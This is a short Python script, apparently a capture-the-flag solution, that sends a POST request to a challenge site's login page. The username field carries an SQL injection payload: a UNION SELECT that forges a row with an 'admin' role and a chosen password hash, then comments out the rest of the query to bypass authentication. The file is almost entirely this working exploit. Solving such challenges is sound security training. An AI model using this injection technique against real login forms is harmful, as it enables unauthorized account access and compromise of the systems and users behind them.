import requests
import base64
import readline
import math
import time
import sys
import urllib

url = 'https://sqlplosion.secchallenge.crysys.hu/login.php'
data = {
    "username": "kAXC' union select 7,'Joe','c0ddd29267facb1bca6c370d3b918bf7','admin'; -- '",
    "password": 'w'
}
r = requests.post(url, data=data)
resp = r.text
print(resp)
